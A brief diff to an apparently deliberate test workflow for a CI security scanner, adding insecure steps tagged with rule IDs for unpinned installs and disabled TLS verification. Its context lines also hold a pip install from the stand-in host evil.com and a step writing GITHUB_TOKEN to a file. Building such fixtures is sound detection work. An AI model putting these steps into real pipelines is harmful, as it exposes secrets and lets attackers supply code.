@@ -91,3 +91,9 @@ jobs:
       - run: docker run --privileged myimage
       - run: pip install --index-url http://evil.com/simple/ pkg
       - run: echo $GITHUB_TOKEN > token.txt
+      # GHA-021: package install without lockfile enforcement.
+      - run: npm install
+      # GHA-022: dependency update bypasses lockfile pins.
+      - run: pip install --upgrade requests
+      # GHA-023: TLS verification bypass.
+      - run: git config --global http.sslVerify false
